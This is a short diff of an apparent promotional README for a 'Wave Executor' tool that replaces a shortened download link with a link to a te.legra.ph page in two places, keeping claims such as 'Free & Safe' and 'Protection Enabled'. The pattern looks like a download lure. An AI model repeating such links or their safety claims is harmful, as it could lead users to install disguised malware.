@@ -4,7 +4,7 @@
 
 ---
 
-🔥 [📥 Download Wave Executor (Free & Safe)](https://shorturl.at/xXnQC)  
+🔥 [📥 Download Wave Executor (Free & Safe)](https://te.legra.ph/qwef32qf2q3fgq234g-07-28)  
 💻 Compatible with Windows 7–11 (64-bit) | 🛡️ Protection Enabled | 🔄 Auto-Updates
 
 ---
@@ -58,7 +58,7 @@
 - 🎯 Targeted script execution
 - 🆙 Always up to date
 
-📦 [👉 Download Wave Executor Now](https://shorturl.at/xXnQC)
+📦 [👉 Download Wave Executor Now](https://te.legra.ph/qwef32qf2q3fgq234g-07-28)
 
 ---
 
